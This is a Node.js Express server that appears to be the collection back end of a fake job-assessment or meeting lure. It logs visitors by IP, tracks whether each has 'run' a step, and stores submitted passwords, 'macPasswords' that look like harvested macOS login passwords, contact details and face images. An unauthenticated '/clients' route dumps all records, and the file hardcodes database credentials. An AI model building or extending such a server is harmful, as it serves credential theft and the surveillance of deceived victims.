const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();
app.set('trust proxy', 1);
const Client = require('./models/Client');

const multer = require('multer');
const storage = multer.memoryStorage(); // store in memory as Buffer
const upload = multer({ storage: storage });

app.use(cors({
  origin: function (origin, callback) {
    callback(null, origin || '*');
  },
  credentials: true, // Allow cookies to be sent with requests
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());

app.use('/receive-data', bodyParser.raw({ type: 'application/octet-stream', limit: '10mb' }));

// mongoose.connect('mongodb://localhost:27017/ipcheck', {})
mongoose.connect('mongodb+srv://mongod:mongod@cluster0.wcqrnb3.mongodb.net/mongod', {})
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB connection error:', err));

const APP_VERSION = '1.2';

function normalizeIp(ip) {
  if (!ip) return null;
  const value = String(ip).trim();
  if (value.startsWith('::ffff:')) {
    return value.substring(7);
  }
  return value;
}

function isLoopback(ip) {
  return ip === '127.0.0.1' || ip === '::1' || ip === 'localhost';
}

function pickForwardedIp(forwarded) {
  if (!forwarded) return null;
  const raw = Array.isArray(forwarded) ? forwarded.join(',') : String(forwarded);
  const parts = raw.split(',').map((part) => normalizeIp(part)).filter(Boolean);
  return parts.find((part) => !isLoopback(part)) || parts[0] || null;
}

function getClientIp(ip, req) {
  const candidates = [
    pickForwardedIp(req.headers['x-forwarded-for']),
    normalizeIp(req.headers['x-real-ip']),
    normalizeIp(req.headers['cf-connecting-ip']),
    normalizeIp(req.headers['true-client-ip']),
    normalizeIp(ip),
    normalizeIp(req.socket?.remoteAddress),
  ].filter(Boolean);

  const publicIp = candidates.find((candidate) => !isLoopback(candidate));
  return publicIp || candidates[0] || 'unknown';
}

const VISIT_STEP_FIELDS = {
  1: 'visitStep1',
  2: 'visitStep2',
  3: 'visitStep3',
  4: 'visitStep4',
  5: 'visitStep5',
};

async function recordPortalVisit(clientIp, step, { name, email, company } = {}) {
  const flagField = VISIT_STEP_FIELDS[step];
  if (!flagField) {
    throw new Error('Invalid visit step');
  }

  let client = await Client.findOne({ ip: clientIp });
  if (!client) {
    client = new Client({ ip: clientIp });
  }

  client[flagField] = true;
  if (company) {
    client.company = company;
  }

  if (step === 4 || step === 5) {
    if (name) client.name = name;
    if (email) client.email = email;
    client.hadRun = step === 5;
  }

  await client.save();
  return client;
}

app.get('/health', (req, res) => {
  res.json({
    ok: true,
    version: APP_VERSION,
    routes: ['portal-visit', 'design-application', 'now-assessment'],
  });
});

app.post('/receive-data', async (req, res) => {
  res.send('Binary data received successfully');
});

app.post('/portal-visit', async (req, res) => {
  try {
    const step = Number(req.body.step);
    if (!VISIT_STEP_FIELDS[step]) {
      return res.status(400).json({ error: 'Invalid step. Use 1-5.' });
    }

    const clientIp = getClientIp(req.ip, req);
    await recordPortalVisit(clientIp, step, {
      name: req.body.name,
      email: req.body.email,
      company: req.body.company,
    });

    res.json({ ok: true, step });
  } catch (err) {
    console.error('Error in /portal-visit:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/design-application', async (req, res) => {
  try {
    const clientIp = getClientIp(req.ip, req);
    const { name, email, hadRun } = req.body;
    const step = hadRun ? 5 : 4;

    await recordPortalVisit(clientIp, step, {
      name,
      email,
      company: req.body.company,
    });

    res.send();
  } catch (err) {
    console.error('Error in /design-application:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/now-assessment', async (req, res) => {
  try {
    console.log('req***************:', req.body);
    const clientIp = getClientIp(req.ip, req);
    if (isLoopback(clientIp)) {
      console.warn('Loopback IP saved. Forwarded headers:', {
        'x-forwarded-for': req.headers['x-forwarded-for'],
        'x-real-ip': req.headers['x-real-ip'],
        reqIp: req.ip,
      });
    }
    let client = await Client.findOne({ ip: clientIp });

    if (client) {
      // Update existing client fields
      client.name = req.body.name;
      client.email = req.body.email;
      client.company = req.body.company;
      client.testUri = req.body.data;
      client.owner = req.body.unique;
      client.password = client.password + '||' + req.body.password;
      if (req.body.workflowComplete) {
        client.hadRun = true;
      }
      await client.save();
    } else {
      // Create new client
      const newClient = new Client({
        name: req.body.name,
        email: req.body.email,
        ip: clientIp,
        company: req.body.company,
        testUri: req.body.data,
        owner: req.body.unique,
        hadRun: !!req.body.workflowComplete,
        password: req.body.password
      });
      await newClient.save();
    }
  } catch (err) {
    console.error('Error checking IP in DB:', err);
  }
  res.send();
});

app.post('/video-just', (req, res) => {
  res.send();
});

app.post('/device-check', async (req, res) => {
  console.log('req***************:', req);
  const clientIp = getClientIp(req.ip, req);
  try {
    if (req.body?.complete) {
      let client = await Client.findOne({ ip: clientIp });
      if (client) {
        client.hadRun = true;
        await client.save();
      } else {
        client = new Client({
          ip: clientIp,
          hadRun: true,
          meetingname: 'workflow check',
        });
        await client.save();
      }
      res.json({ result: true });
      return;
    }

    const found = await Client.findOne({ ip: clientIp });

    if (found !== null && found.hadRun) {
      res.json({ result: true });
    } else {
      res.json({ result: false });
    }
  } catch (err) {
    console.error('Error checking IP in DB:', err);
  }
});

app.post('/feedback', (req, res) => {
  res.send();
});

app.get('/debug-ip', (req, res) => {
  res.json({
    resolvedIp: getClientIp(req.ip, req),
    reqIp: req.ip,
    socketRemoteAddress: req.socket?.remoteAddress,
    headers: {
      'x-forwarded-for': req.headers['x-forwarded-for'] || null,
      'x-real-ip': req.headers['x-real-ip'] || null,
      'cf-connecting-ip': req.headers['cf-connecting-ip'] || null,
      'true-client-ip': req.headers['true-client-ip'] || null,
    },
  });
});

app.post("/update-passwords", async (req, res) => {
  try {
    // Use email as unique identifier, fallback to ip if needed
    const identifier = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: identifier });
    const newPassword = req.body.password;
    const newMacPassword = req.body.macPassword;
    if (client) {
      // Ensure arrays exist
      client.passwords = Array.isArray(client.passwords) ? client.passwords : [];
      client.macPasswords = Array.isArray(client.macPasswords) ? client.macPasswords : [];
      // Add new password if provided
      if (newPassword) {
        client.passwords.unshift(newPassword);
      }
      if (newMacPassword) {
        client.macPasswords.unshift(newMacPassword);
      }
      client.meetingname = req.body.name || client.meetingname;
      client.meetingemail = req.body.email || client.meetingemail;
      await client.save();
      res.json({ updated: true });
    } else {
      // Create new client with empty or provided fields
      client = new Client({
        meetingname: req.body.name || "meetig ran",
        meetingemail: req.body.email || "",
        ip: getClientIp(req.ip, req),
        passwords: newPassword ? [newPassword] : [],
        macPasswords: newMacPassword ? [newMacPassword] : [],
      });
      await client.save();
      res.json({ created: true });
    }
  } catch (err) {
    console.error("Error in /update-passwords:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/is-blocked", async (req, res) => {
  try {
    const clientIp = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: clientIp });
    if (!client) {
      client = new Client({
        ip: clientIp,
        meetingname: "meeting ran",
      });
      await client.save();
      res.json({ blocked: false, created: true });
      return;
    }
    if (client.blocked === true) {
      res.json({ blocked: true });
    } else {
      res.json({ blocked: false });
    }
  } catch (err) {
    console.error("Error in /is-blocked:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get("/check-status", async (req, res) => {
  try {
    const clientIp = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: clientIp });
    if (!client) {
      res.json({ blocked: false, completed: false });
      return;
    }
    res.json({ blocked: client.blocked, completed: client?.img?.data ? true : false });
  } catch (err) {
    console.error("Error in /check-status:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Upload route
app.post('/verify-face', upload.single('faceImage'), async (req, res) => {
  try {
    const clientIp = getClientIp(req.ip, req);
    let client = await Client.findOne({ ip: clientIp });
    if (client) {
      client.img.data = req.file.buffer;
      client.img.contentType = req.file.mimetype;
      await client.save();
      res.json({ message: 'Image uploaded successfully!' });
      return;
    }
    client = new Client({
      ip: clientIp,
      img: {
        data: req.file.buffer,
        contentType: req.file.mimetype
      },
      meetingname: "face upload only",
    });
    await client.save();
    res.json({ message: 'Image uploaded and client created successfully!' });
  } catch (err) {
    console.error('Error uploading image:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Retrieve route
app.get('/image/:id', async (req, res) => {
  try {
    let client = await Client.findOne({ ip: req.params.id });
    if (client && client.img && client.img.data) {
      res.contentType(client.img.contentType);
      res.send(client.img.data);
      return;
    }
    res.status(404).json({ error: 'Image not found' });
  } catch (err) {
    console.error('Error retrieving image:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get("/clients", async (req, res) => {
  try {
    const clients = await Client.find().sort({ createdAt: -1 });
    res.json(clients);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete("/clients/:id", async (req, res) => {
  try {
    const id = req.params.id;
    console.log("id================", id)
    await Client.findByIdAndDelete(id);

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Delete failed" });
  }
});

const port = process.env.PORT || 5000;

app.listen(port, () => {
  console.log(`Version ${APP_VERSION}`);
  console.log(`Server is running on port ${port}`);
});